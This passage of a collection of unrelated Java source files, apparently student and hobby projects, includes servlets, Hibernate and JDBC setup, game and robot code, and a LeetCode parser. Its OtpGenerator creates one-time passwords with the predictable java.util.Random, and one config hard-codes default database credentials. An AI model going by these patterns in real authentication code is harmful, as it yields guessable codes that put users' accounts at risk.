description = \"Should calls be made to GitHub's API for user information\", negatable = true)\n    boolean ghLookup = true;\n\n    @Option(names = {\"-m\", \"--lgin-mapping\"}, description = {\"Mapping of GitHub logins to names. Format: name=login\"})\n    Map<String, String> loginMapping = Map.of(\"shawn.jj\", \"shawn-jj\",\n            \"Harshit.Gupta7\", \"harsh1898\",\n            \"Ramandeep Singh\", \"rdsingh13\",\n            \"luklehnert\", \"lwlR\",\n            \"Filippa Nilsson\", \"filippanilsson\",\n            \"Houssem Nasri\", \"HoussemNasri\",\n            \"Anish.Pal\", \"pal-anish\");\n\n    private static final String avatarImgWidth = \"117\";\n\n    private static final String githubUsersEmailSuffix = \"@users.noreply.github.com\";\n\n    private record Contributor(String name, String url, String avatarUrl) implements Serializable {\n    }\n\n    private record CoAuthor(String name, String email) {\n        public CoAuthor(String line) {\n            this(line.substring(\"Co-authored-by: \".length(), line.indexOf('<')).trim(),\n                    line.substring(line.indexOf('<') + 1, line.indexOf('>')).trim());\n            Logger.trace(\"Parsed \\\"{}\\\" into {}\", line, this);\n        }\n    }\n\n    private SortedSet<Contributor> contributors = new TreeSet<>((",
    "package io.marioslab.sol.entity;\n\nimport com.badlogic.gdx.graphics.Color;\nimport com.badlogic.gdx.graphics.g2d.GlyphLayout;\nimport com.badlogic.gdx.graphics.g2d.SpriteBatch;\nimport com.badlogic.gdx.math.MathUtils;\nimport io.marioslab.sol.Assets;\nimport io.marioslab.sol.Entity;\nimport io.marioslab.sol.Game;\n\npublic class Text extends Entity {\n\tString fontName;\n\tColor color;\n\tString text;\t\n\tfloat duration;\n\tfloat stateTime;\n\tGlyphLayout glyphLayout = new GlyphLayout();\n\t\n\tpublic Text(String text, Color color, float duration, int x, int y) {\n\t\tthis(\"default\", text, color, duration, x, y, 10000000);\n\t}\n\t\n\tpublic Text(String fontName, String text, Color color, float duration, int x, int y, int z) {\n\t\tsuper(\"\" + MathUtils.random(), x, y, z);\n\t\tthis.fontName = fontName;\n\t\tthis.color = color;\n\t\tthis.text = text;\n\t\tthis.duration = duration;\n\t}\n\n\t@Override\n\tpublic void draw (float deltaTime, SpriteBatch batch) {\n\t\tstateTime += deltaTime;\n\t\tif(stateTime > duration) {\n\t\t\tGame.ctx.removeDrawable(this);\n\t\t\treturn;\n\t\t}\n\t\t\n\t\tfloat alpha = 1;\n\t\tif(stateTime < 0.4f) {\n\t\t\talpha = stateTime / 0.4f;\n\t\t}\n\t\t\n\t\tif(stateTime > duration - 0.2f) {\t\t\t\n\t\t\talpha = ((duration - stateTime) / 0.2f);\n\t\t}\n\t\t\n\t\t// TextBounds bounds = Assets.font.getBounds(text);\n\t\tglyphLayout.setText(Assets.font, text);\n\t\tAssets.font.setColor(color.r, color.g, color.b, alpha);\n\t\tAssets.font.draw(batch, text, x - (int)(glyphLayout.width / 2), y + (int)(glyphLayout.height / 2));\n\t\t// Assets.font.draw(batch, text, x, y);\n\t}\n\n\t@Override\n\tpublic Entity copy () {\n\t\treturn new Text(fontName, text, color, duration, (int)x, (int)y, (int)z);\n\t};\n}\n",
    "package app.config;\n\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.util.Properties;\n\nimport app.entities.Event;\nimport app.entities.User;\nimport app.entities.Role;\nimport app.exceptions.ApiException;\nimport org.hibernate.SessionFactory;\nimport org.hibernate.boot.registry.StandardServiceRegistryBuilder;\nimport org.hibernate.cfg.Configuration;\nimport org.hibernate.service.ServiceRegistry;\nimport jakarta.persistence.EntityManagerFactory;\n\npublic class HibernateConfig {\n\n    private static EntityManagerFactory instace;\n    private static String dbName;\n\n    public static EntityManagerFactory getEntityManagerFactory(boolean testing) {\n        if (testing) {\n            dbName = \"testdb\";\n            if (instace == null) {\n                instace = setupHibernateConfigurationForTesting();\n            }\n            return instace;\n        } else {\n            if (instace == null) {\n                dbName = getDBName();\n                instace = buildEntityFactoryConfig();\n            }\n            return instace;\n        }\n    }\n\n    private static EntityManagerFactory buildEntityFactoryConfig() {\n        try {\n            Configuration configuration = new Configuration();\n\n            Properties props = new Properties();\n            String connctionURL = String.format(\"jdbc:postgresql://localhost:5432/%s?currentSchema=public\", dbName);\n            props.put(\"hibernate.connection.url\", connctionURL);\n            props.put(\"hibernate.connection.username\", \"postgres\");\n            props.put(\"hibernate.connection.password\", \"postgres\");\n            props.put(\"hibernate.show_sql\", \"true\"); // show sql in console\n            props.put(\"hibernate.format_sql\", \"true\"); // format sql in console\n            props.put(\"hibernate.use_sql_comments\", \"true\"); // show sql comments in console\n\n            props.put(\"hibernate.dialect\", \"org.hibernate.dialect.PostgreSQLDialect\"); // dialect for postgresql\n            props.put(\"hibernate.connection.driver_class\", \"org.postgresql.Driver\"); // driver class for postgresql\n            props.put(\"hibernate.archive.autodetection\", \"class\"); // hibernate scans for annotated classes\n            props.put(\"hibernate.current_session_context_class\", \"thread\"); // hibernate current session context\n            props.put(\"hibernate.hbm2ddl.auto\", \"update\"); // hibernate creates tables based on entities\n\n            return getEntityManagerFactory(configuration, props);\n        } catch (Throwable ex) {\n            System.err.println(\"Initial SessionFactory creation failed.\" + ex);\n            throw new ExceptionInInitializerError(ex);\n        }\n    }\n\n    private static EntityManagerFactory setupHibernateConfigurationForTesting() {\n        try {\n            Configuration configuration = new Configuration();\n            Properties props = new Properties();\n            props.put(\"hibernate.dialect\", \"org.hibernate.dialect.PostgreSQLDialect\");\n            props.put(\"hibernate.connection.driver_class\", \"org.testcontainers.jdbc.ContainerDatabaseDriver\");\n            props.put(\"hibernate.connection.url\", \"jdbc:tc:postgresql:15.3-alpine3.18:///test-db\");\n            props.put(\"hibernate.connection.username\", \"postgres\");\n            props.put(\"hibernate.connection.password\", \"postgres\");\n            props.put(\"hibernate.archive.autodetection\", \"class\");\n            // props.put(\"hibernate.show_sql\", \"true\");\n            props.put(\"hibernate.hbm2ddl.auto\", \"create-drop\");\n            return getEntityManagerFactory(configuration, props);\n        } catch (Throwable ex) {\n            System.err.println(\"Initial SessionFactory creation failed.\" + ex);\n            throw new ExceptionInInitializerError(ex);\n        }\n    }\n\n    private static EntityManagerFactory getEntityManagerFactory(Configuration configuration, Properties props) {\n        configuration.setProperties(props);\n\n        getAnnotationConfiguration(configuration);\n\n        ServiceRegistry serviceRegistry = new StandardServiceRegistryBuilder()\n                .applySettings(configuration.getProperties()).build();\n        System.out.println(\"Hibernate Java Config serviceRegistry created\");\n\n        SessionFactory sf = configuration.buildSessionFactory(serviceRegistry);\n        return sf.unwrap(EntityManagerFactory.class);\n    }\n\n    private static void getAnnotationConfiguration(Configuration configuration) {\n        // add annotated classes\n        configuration.addAnnotatedClass(User.class);\n        configuration.addAnnotatedClass(Role.class);\n        configuration.addAnnotatedClass(Event.class);\n\n    }\n\n    private static String getDBName() {\n        return Utils.getPropertyValue(\"db.name\", \"properties-from-pom.properties\");\n    }\n\n    /**\n     * Purpose: Utility class to read properties from a file\n     * Author: Thomas Hartmann\n     */\n    public class Utils {\n        public static String getPropertyValue(String propName, String ressourceName) {\n            // REMEMBER TO BUILD WITH MAVEN FIRST. Read the property file i",
    "package org.example;\n\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.MultipartConfig;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.Part;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\n\n@WebServlet(\"/fileUploadClass\")\n@MultipartConfig(\n        location = \"/tmp\",\n        fileSizeThreshold = 1024 * 1024, // 1MB\n        maxFileSize = 1024 * 1024 * 20, // 20MB\n        maxRequestSize = 1024 * 1024 * 50 // 50MB\n)\npublic class FileUpload extends HttpServlet {\n    public void doPost(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException {\n\n        //String filename=req.getParameter(\"fileName\");\n        Part filePart=req.getPart(\"userFile\");\n        //res.getWriter().println(filename);\n\n        InputStream file=filePart.getInputStream();\n\n        BufferedReader reader=new BufferedReader(new InputStreamReader(file));\n        String word;\n\n        while((word=reader.readLine())!=null){\n            res.getWriter().print(word);\n        }\n\n        reader.close();\n        file.close();\n    }\n}\n",
    "package app.persistence;\n\nimport app.entities.Topping;\nimport app.entities.Base;\nimport app.exceptions.DatabaseException;\n\nimport java.sql.Connection;\nimport java.sql.PreparedStatement;\nimport java.sql.ResultSet;\nimport java.sql.SQLException;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class CupcakeMapper {\n\n\n    public static Topping getToppingByID(int toppingID, ConnectionPool connectionPool) throws DatabaseException {\n\n        String sql = \"SELECT * FROM toppings WHERE topping_id = ?\";\n\n        try (Connection connection = connectionPool.getConnection();\n             PreparedStatement ps = connection.prepareStatement(sql)) {\n\n            ps.setInt(1, toppingID);\n\n            ResultSet rs = ps.executeQuery();\n\n\n            if (rs.next()) {\n\n                String toppingName = rs.getString(\"topping_name\");\n                int toppingPrice = rs.getInt(\"topping_price\");\n                return new Topping(toppingID, toppingName, toppingPrice);\n            } else {\n                throw new DatabaseException(\"Error topping not found\");\n            }\n\n\n        } catch (SQLException e) {\n            throw new RuntimeException(e);\n        }\n\n    }\n\n    public static Base getBaseByID(int baseID, ConnectionPool connectionPool) throws DatabaseException {\n        String sql = \"SELECT * FROM bases WHERE base_id = ?\";\n\n        try (Connection connection = connectionPool.getConnection();\n             PreparedStatement ps = connection.prepareStatement(sql)) {\n\n            ps.setInt(1, baseID);\n            ResultSet rs = ps.executeQuery();\n\n\n            if (rs.next()) {\n                String baseName = rs.getString(\"base_name\");\n                int basePrice = rs.getInt(\"base_price\");\n                return new Base(baseID, baseName, basePrice);\n\n            } else {\n                throw new DatabaseException(\"Error no base found\");\n            }\n\n        } catch (SQLException e) {\n            throw new RuntimeException(e);\n        }\n\n    }\n\n    public static List<Topping> getAllToppings(ConnectionPool connectionPool) {\n        String sql = \"SELECT * FROM toppings\";\n        List<Topping> toppingList = new ArrayList<>();\n\n        try (Connection connection = connectionPool.getConnection();\n             PreparedStatement ps = connection.prepareStatement(sql)) {\n\n            ResultSet rs = ps.executeQuery();\n\n            while (rs.next()) {\n                int toppingID = rs.getInt(\"topping_id\");\n                String toppingName = rs.getString(\"topping_name\");\n                int toppingPrice = rs.getInt(\"topping_price\");\n                toppingList.add(new Topping(toppingID, toppingName, toppingPrice));\n            }\n        } catch (SQLException e) {\n            throw new RuntimeException(e);\n        }\n\n        return toppingList;\n\n    }\n\n    public static List<Base> getAllBases(ConnectionPool connectionPool) {\n        String sql = \"SELECT * FROM bases\";\n        List<Base> baseList = new ArrayList<>();\n\n        try (Connection connection = connectionPool.getConnection();\n             PreparedStatement ps = connection.prepareStatement(sql)) {\n\n            ResultSet rs = ps.executeQuery();\n\n            while (rs.next()) {\n                int baseID = rs.getInt(\"base_id\");\n                String baseName = rs.getString(\"base_name\");\n                int basePrice = rs.getInt(\"base_price\");\n                baseList.add(new Base(baseID, baseName, basePrice));\n            }\n        } catch (SQLException e) {\n            throw new RuntimeException(e);\n        }\n\n        return baseList;\n    }\n\n\n}\n",
    "package com.lx862.quitgame;\n\nimport net.minecraft.client.MinecraftClient;\nimport net.minecraft.client.font.TextRenderer;\nimport net.minecraft.client.gui.DrawContext;\nimport net.minecraft.util.math.RotationAxis;\nimport org.joml.Vector2d;\n\npublic class SplashTextCharacter {\n    private final char character;\n    private Vector2d startPos;\n    private Vector2d targetPos;\n    private Vector2d renderedPos;\n    public double width;\n    private boolean dragging;\n\n    public SplashTextCharacter(char character) {\n        this.character = character;\n        this.targetPos = new Vector2d(0, 0);\n        this.renderedPos = new Vector2d(0, 0);\n        this.width = MinecraftClient.getInstance().textRenderer.getWidth(String.valueOf(character));\n    }\n\n    public char getChar() {\n        return character;\n    }\n\n    public void setStartPos(double x, double y) {\n        this.startPos = new Vector2d(x, y);\n    }\n\n    public void setTargetPos(double x, double y) {\n        this.targetPos = new Vector2d(x, y);\n    }\n\n    public void setRenderPos(double x, double y) {\n        this.renderedPos = new Vector2d(x, y);\n    }\n\n    public boolean hovered(double mouseX, double mouseY) {\n        return hoveredXAxis(mouseX) && hoveredYAxis(mouseY);\n    }\n\n    public boolean hoveredXAxis(double mouseX) {\n        double startX = (startPos.x) + (targetPos.x * QuitGame.scale);\n        double endX = startX + ((width + 0.5) * QuitGame.scale);\n        return mouseX >= startX && mouseX <= endX;\n    }\n\n    public boolean hoveredYAxis(double mouseY) {\n        double startY = (startPos.y) + ((targetPos.y - 1) * QuitGame.scale);\n        double endY = startY + ((8 + 2) * QuitGame.scale);\n        return mouseY >= startY && mouseY <= endY;\n    }\n\n    public void render(DrawContext drawContext, double deltaTime, int alpha, TextRenderer textRenderer) {\n        renderedPos = renderedPos.lerp(targetPos, deltaTime);\n\n        drawContext.getMatrices().push();\n        drawContext.getMatrices().translate(renderedPos.x, renderedPos.y, 0);\n        drawContext.getMatrices().multiply(RotationAxis.POSITIVE_Z.rotationDegrees(-QuitGame.rotAngle));\n        drawContext.drawTextWithShadow(textRenderer, String.valueOf(character), 0, 0, 16776960 | alpha);\n        drawContext.getMatrices().pop();\n    }\n\n    public void renderBoundary(DrawContext drawContext, double deltaTime, TextRenderer textRenderer) {\n        double startX = (startPos.x) + (targetPos.x * QuitGame.scale);\n        double startY = (startPos.y) + ((targetPos.y - 1) * QuitGame.scale);\n        double endX = ((width + 0.5) * QuitGame.scale);\n        double endY = ((8 + 2) * QuitGame.scale);\n\n        drawContext.drawBorder((int)startX, (int)startY, (int)endX, (int)endY, 0xFFFFFFFF);\n    }\n\n    public void dragged() {\n        dragging = true;\n    }\n\n    public boolean isDragging() {\n        return dragging;\n    }\n\n    public void released() {\n        dragging = false;\n    }\n}\n",
    "package org.firstinspires.ftc.teamcode.drive.opmode;\n\nimport com.acmerobotics.dashboard.config.Config;\nimport com.acmerobotics.roadrunner.geometry.Pose2d;\nimport com.acmerobotics.roadrunner.trajectory.Trajectory;\nimport com.qualcomm.robotcore.eventloop.opmode.Autonomous;\nimport com.qualcomm.robotcore.eventloop.opmode.Disabled;\nimport com.qualcomm.robotcore.eventloop.opmode.LinearOpMode;\n\nimport org.firstinspires.ftc.teamcode.drive.SampleMecanumDrive;\n\n/*\n * Op mode for preliminary tuning of the follower PID coefficients (located in the drive base\n * classes). The robot drives back and forth in a straight line indefinitely. Utilization of the\n * dashboard is recommended for this tuning routine. To access the dashboard, connect your computer\n * to the RC's WiFi network. In your browser, navigate to https://192.168.49.1:8080/dash if you're\n * using the RC phone or https://192.168.43.1:8080/dash if you are using the Control Hub. Once\n * you've successfully connected, start the program, and your robot will begin moving forward and\n * backward. You should observe the target position (green) and your pose estimate (blue) and adjust\n * your follower PID coefficients such that you follow the target position as accurately as possible.\n * If you are using SampleMecanumDrive, you should be tuning TRANSLATIONAL_PID and HEADING_PID.\n * If you are using SampleTankDrive, you should be tuning AXIAL_PID, CROSS_TRACK_PID, and HEADING_PID.\n * These coefficients can be tuned live in dashboard.\n *\n * This opmode is designed as a convenient, coarse tuning for the follower PID coefficients. It\n * is recommended that you use the FollowerPIDTuner opmode for further fine tuning.\n */\n@Config\n@Disabled\n@Autonomous(group = \"drive\")\npublic class BackAndForth extends LinearOpMode {\n\n    public static double DISTANCE = 50;\n\n    @Override\n    public void runOpMode() throws InterruptedException {\n        SampleMecanumDrive drive = new SampleMecanumDrive(hardwareMap);\n\n        Trajectory trajectoryForward = drive.trajectoryBuilder(new Pose2d())\n                .forward(DISTANCE)\n                .build();\n\n        Trajectory trajectoryBackward = drive.trajectoryBuilder(trajectoryForward.end())\n                .back(DISTANCE)\n                .build();\n\n        waitForStart();\n\n        while (opModeIsActive() && !isStopRequested()) {\n            drive.followTrajectory(trajectoryForward);\n            drive.followTrajectory(trajectoryBackward);\n        }\n    }\n}",
    "package com.cydeo.jdbctests.day01;\n\nimport java.sql.*;\n\npublic class P01_TestSQLLite {\n\n    public static void main(String[] args) throws SQLException {\n        //CONNECTION STRING\n        String dbUrl = System.getenv(\"DB_URL\");\n        // This is your own path\n        String dbUsername =\"\";\n        String dbPassword = \"\";\n\n        /*\n        // Comes from Project env variable\n        System.out.println(System.getenv(\"Mypassword\"));\n        // Comes from Local env variable\n        System.out.println(System.getenv(\"LIBRARY_USER\"));\n        // LIBRARY_USER=librarian@library.com\n        */\n\n\n\n        //Create the connection\n        //DriverManager class getConnection Method will help to connect database\n        Connection conn = DriverManager.getConnection(dbUrl, dbUsername, dbPassword);\n\n        //It will help us to execute queries\n        Statement statement = conn.createStatement();\n\n        //ResultSet will store data after execution. It stores only data(there is no table info)\n        ResultSet rs = statement.executeQuery(\"select * from Categories\");\n\n\n        while (rs.next()){\n\n            System.out.println(rs.getString(1)+\" - \"+rs.getString(2)+\" - \"+rs.getString(3));\n\n        }\n\n        //close connection\n        rs.close();\n        statement.close();\n        conn.close();\n\n    }}",
    "package src.Models;\n\nimport java.time.LocalDate;\n\npublic class Historia {\n    private int id;\n    private String nome;\n    private String prologo;\n    private int qtd_jogadores;\n    private LocalDate dt_inicio;\n    private boolean presencial;\n    private Mestre mestre;\n    private Personagem personagens;\n\n    public Historia(int id, String nome, String prologo, int qtd_jogadores, LocalDate dt_inicio, boolean presencial, Mestre mestre, Personagem personagens) {\n        this.id = id;\n        this.nome = nome;\n        this.prologo = prologo;\n        this.qtd_jogadores = qtd_jogadores;\n        this.dt_inicio = dt_inicio;\n        this.presencial = presencial;\n        this.mestre = mestre;\n        this.personagens = personagens;\n    }\n\n    public Historia() {\n        super();\n    }\n\n    public int getId() {\n        return id;\n    }\n\n    public void setId(int id) {\n        this.id = id;\n    }\n\n    public String getNome() {\n        return nome;\n    }\n\n    public void setNome(String nome) {\n        this.nome = nome;\n    }\n\n    public String getPrologo() {\n        return prologo;\n    }\n\n    public void setPrologo(String prologo) {\n        this.prologo = prologo;\n    }\n\n    public int getQtd_jogadores() {\n        return qtd_jogadores;\n    }\n\n    public void setQtd_jogadores(int qtd_jogadores) {\n        this.qtd_jogadores = qtd_jogadores;\n    }\n\n    public LocalDate getDt_inicio() {\n        return dt_inicio;\n    }\n\n    public void setDt_inicio(LocalDate dt_inicio) {\n        this.dt_inicio = dt_inicio;\n    }\n\n    public boolean isPresencial() {\n        return presencial;\n    }\n\n    public void setPresencial(boolean presencial) {\n        this.presencial = presencial;\n    }\n\n    public Mestre getMestre() {\n        return mestre;\n    }\n\n    public void setMestre(Mestre mestre) {\n        this.mestre = mestre;\n    }\n\n    public Personagem getPersonagens() {\n        return personagens;\n    }\n\n    public void setPersonagens(Personagem personagens) {\n        this.personagens = personagens;\n    }\n\n    @java.lang.Override\n    public java.lang.String toString() {\n        return \"Historia{\" +\n                \"id=\" + id +\n                \", nome='\" + nome + '\\'' +\n                \", prologo=\" + prologo +\n                \", qtd_jogadores=\" + qtd_jogadores +\n                \", dt_inicio=\" + dt_inicio +\n                \", presencial=\" + presencial +\n                \", mestre=\" + mestre +\n                \", personagens=\" + personagens +\n                '}';\n    }\n}",
    "package com.nefentus.api.Services;\n\nimport com.google.common.cache.CacheBuilder;\nimport com.google.common.cache.CacheLoader;\nimport com.google.common.cache.LoadingCache;\n\nimport org.springframework.context.annotation.Description;\nimport org.springframework.stereotype.Service;\n\nimport java.util.Random;\nimport java.util.concurrent.ExecutionException;\nimport java.util.concurrent.TimeUnit;\n\n@Service\npublic class OtpGenerator {\n\n    private static final Integer EXPIRE_MIN = 5;\n    private LoadingCache<String, Integer> otpCache;\n\n    /**\n     * Constructor configuration.\n     */\n    public OtpGenerator()\n    {\n        super();\n        otpCache = CacheBuilder.newBuilder()\n                .expireAfterWrite(EXPIRE_MIN, TimeUnit.MINUTES)\n                .build(new CacheLoader<String, Integer>() {\n                    @Override\n                    public Integer load(String s) throws Exception {\n                        return 0;\n                    }\n                });\n    }\n\n    /**\n     * Method for generating OTP and put it in cache.\n     *\n     * @param key - cache key\n     * @return cache value (generated OTP number)\n     */\n    public Integer generateOTP(String key)\n    {\n        Random random = new Random();\n        int OTP = 100000 + random.nextInt(900000);\n        otpCache.put(key, OTP);\n\n        return OTP;\n    }\n\n    /**\n     * Method for getting OTP value by key.\n     *\n     * @param key - target key\n     * @return OTP value\n     */\n    public Integer getOPTByKey(String key)\n    {\n        return otpCache.getIfPresent(key);\n    }\n\n    /**\n     * Method for removing key from cache.\n     *\n     * @param key - target key\n     */\n    public void clearOTPFromCache(String key) {\n        otpCache.invalidate(key);\n    }\n}\n",
    "package org.example;\n\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport javax.servlet.RequestDispatcher;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.HttpSession;\nimport java.io.IOException;\nimport java.sql.ResultSet;\nimport java.sql.SQLException;\nimport java.util.logging.LogManager;\n\n\n@WebServlet(\"/showRes\")\npublic class show extends HttpServlet {\n    Logger log= LoggerFactory.getLogger(show.class);\n  //  java.util.logging.Logger li = (java.util.logging.Logger) LoggerFactory.getLogger(show.class);\n    public void doGet(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException {\n        ResultSet rs= null;\n        try {\n            HttpSession ses = req.getSession();\n            String uname = (String) ses.getAttribute(\"username\");\n            rs = JdbcConnection.fetchdata(uname);\n            log.info(\"JDBC conected\");\n        } catch (SQLException e) {\n            throw new RuntimeException(e);\n        }\n\n        req.setAttribute(\"result\",rs);\n        RequestDispatcher red = req.getRequestDispatcher(\"Show.jsp\");\n        red.forward(req,res);\n\n    }\n}\n",
    "package com.example.demo.services;\n\nimport java.util.ArrayList;\nimport java.util.Optional;\n\nimport com.example.demo.models.UsuarioModel;\nimport com.example.demo.repositories.UsuarioRepository;\n\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.stereotype.Service;\n\n@Service\npublic class UsuarioService {\n    @Autowired\n    UsuarioRepository usuarioRepository;\n    \n    public ArrayList<UsuarioModel> obtenerUsuarios(){\n        return (ArrayList<UsuarioModel>) usuarioRepository.findAll();\n    }\n\n    public UsuarioModel guardarUsuario(UsuarioModel usuario){\n        return usuarioRepository.save(usuario);\n    }\n\n    public Optional<UsuarioModel> obtenerPorId(Long id){\n        return usuarioRepository.findById(id);\n    }\n\n\n    public ArrayList<UsuarioModel>  obtenerPorPrioridad(Integer prioridad) {\n        return usuarioRepository.findByPrioridad(prioridad);\n    }\n\n    public boolean eliminarUsuario(Long id) {\n        try{\n            usuarioRepository.deleteById(id);\n            return true;\n        }catch(Exception err){\n            return false;\n        }\n    }\n\n\n    \n}",
    "package org.among.usermodule.user.security;\n\nimport org.among.usermodule.user.UserEntity;\nimport org.springframework.security.core.GrantedAuthority;\nimport org.springframework.security.core.userdetails.UserDetails;\n\nimport java.time.LocalDateTime;\nimport java.util.Collection;\n\npublic class User implements UserDetails {\n    private final UserEntity userEntity;\n\n    public User(UserEntity userEntity) {\n        this.userEntity = userEntity;\n    }\n\n    @Override\n    public Collection<? extends GrantedAuthority> getAuthorities() {\n        return null;\n    }\n\n    @Override\n    public String getPassword() {\n        return userEntity.getPassword();\n    }\n\n    @Override\n    public String getUsername() {\n        return userEntity.getEmail();\n    }\n\n    public String getFullNameOfUser() {\n        return userEntity.getUsername();\n    }\n\n    public LocalDateTime getLastLoginDateTime() {\n        return userEntity.getLastLoginDateTime();\n    }\n\n    @Override\n    public boolean isAccountNonExpired() {\n        return true;\n    }\n\n    @Override\n    public boolean isAccountNonLocked() {\n        return true;\n    }\n\n    @Override\n    public boolean isCredentialsNonExpired() {\n        return true;\n    }\n\n    @Override\n    public boolean isEnabled() {\n        return true;\n    }\n}\n",
    "/*\n * Copyright (C) 2024-2026 Jidcoo(https://github.com/jidcoo).\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n * http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\npackage io.github.jidcoo.opto.lcdb.enhancer.core.parser;\n\nimport io.github.jidcoo.opto.lcdb.enhancer.utils.BeanUtil;\nimport io.github.jidcoo.opto.lcdb.enhancer.utils.ReflectUtil;\nimport io.github.jidcoo.opto.lcdb.enhancer.base.BaseParameterAcceptStrategy;\nimport io.github.jidcoo.opto.lcdb.enhancer.base.Order;\nimport io.github.jidcoo.opto.lcdb.enhancer.base.Strategizable;\nimport io.github.jidcoo.opto.lcdb.enhancer.utils.AssertUtil;\nimport io.github.jidcoo.opto.lcdb.enhancer.utils.ContainerCheckUtil;\n\nimport javax.annotation.Resource;\nimport java.lang.reflect.Modifier;\nimport java.util.*;\nimport java.util.stream.Collectors;\n\n/**\n * <p>ParameterAcceptor is a parameter acceptor\n * used to dynamically accept leetcode input as\n * input parameters that match the type of\n * leetcode invoker.\n * </p>\n *\n * <p>ParameterAcceptor performs appropriate acceptance\n * of input objects based on built-in parameter\n * acceptance strategies and external acceptance\n * strategies by {@link #accept(Class, Object)}.\n * </p>\n *\n * @author Jidcoo\n * @see BaseParameterAcceptStrategy\n * @see ParameterAcceptResult\n * @see IRMatchInputParserNode\n * @since 1.0\n */\nfinal class ParameterAcceptor extends BaseParameterAcceptStrategy<Object> {\n\n    /**\n     * Builtin parameter acceptance strategy map.\n     */\n    private Map<Class<?>, Set<BaseParameterAcceptStrategy<?>>> builtinAcceptStrategyMap;\n\n    /**\n     * BaseParameterAcceptStrategy comparator.\n     */\n    private final Comparator<Order> strategyComparator = Comparator.comparingInt(Order::getOrder).reversed();\n\n    /**\n     * Built-in  parameter acceptance strategy set package location.\n     */\n    private static final String BUILT_IN_PARAMETER_ACCEPTANCE_STRATEGY_PACKAGE = \"io.github.jidcoo.opto.lcdb.enhancer.core.parser.builtin\";\n\n    /**\n     * Create a ParameterAcceptor instance.\n     */\n    ParameterAcceptor() {\n        this.builtinAcceptStrategyMap = new HashMap<>();\n        // Collect all builtin parameter acceptance strategies.\n        List<BaseParameterAcceptStrategy> strategies = BeanUtil.collectBeans(BaseParameterAcceptStrategy.class,\n                BUILT_IN_PARAMETER_ACCEPTANCE_STRATEGY_PACKAGE,\n                (Class type) -> type.isAnnotationPresent(Resource.class) && ReflectUtil.isExtendsClass(type,\n                        BaseParameterAcceptStrategy.class) && !Modifier.isAbstract(type.getModifiers()), (Class<?\n                        extends BaseParameterAcceptStrategy> beanType) -> ReflectUtil.createInstance(beanType)).stream().filter(Objects::nonNull).collect(Collectors.toList());\n        if (!ContainerCheckUtil.isListEmpty(strategies)) {\n            // Add all strategies to the builtinAcceptStrategyMap.\n            for (BaseParameterAcceptStrategy<?> strategy : strategies) {\n                addParameterAcceptStrategy(strategy.getAcceptableType(), strategy, builtinAcceptStrategyMap);\n            }\n        }\n    }\n\n    /**\n     * Wrap the strategy add function.\n     *\n     * @param type        the accepted class type.\n     * @param strategy    the acceptance strategy.\n     * @param strategyMap the acceptance strategy map.\n     */\n    private void addParameterAcceptStrategy(Class<?> type, BaseParameterAcceptStrategy<?> strategy, Map<Class<?>,\n            Set<BaseParameterAcceptStrategy<?>>> strategyMap) {\n        AssertUtil.nonNull(strategy, \"The parameter acceptance strategy cannot be null.\");\n        AssertUtil.nonNull(type, \"The type of the \" + strategy + \" cannot be null.\");\n        // Get the strategySet by clazz.\n        Set<BaseParameterAcceptStrategy<?>> strategySet = strategyMap.computeIfAbsent(type,\n                key -> new TreeSet<>(strategyComparator));\n        // Add the strategy to the set.\n        strategySet.add(strategy);\n    }\n\n    /**\n     * Accept an object with the parameter type.\n     *\n     * @param invokerParameterType the leetcode invoker parameter type.\n     * @param object               the input object for accepting.\n     * @return the parameter acceptance result.\n     */\n    public ParameterAcceptResult accept(Class invokerParameterType, Object object) {\n        // Create a tracer stack for tracking the acceptance process.\n        Stack<ParameterAcceptStrategyTracer> tracerStack = new Stack<>();\n\n        try {\n            // Find the strategy set for the parameter acceptance.\n            Set<BaseParameterAcceptStrategy<?>> str",
    "/*\n * Copyright (C) 2024 Marcus Hirt\n *                    www.hirt.se\n *\n * This software is free:\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions\n * are met:\n *\n * 1. Redistributions of source code must retain the above copyright\n *    notice, this list of conditions and the following disclaimer.\n * 2. Redistributions in binary form must reproduce the above copyright\n *    notice, this list of conditions and the following disclaimer in the\n *    documentation and/or other materials provided with the distribution.\n * 3. The name of the author may not be used to endorse or promote products\n *    derived from this software without specific prior written permission.\n *\n * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESSED OR\n * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES\n * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.\n * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,\n * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT\n * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,\n * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY\n * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\n * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF\n * THIS SOFTWARE, EVEN IF ADVISED OF THE 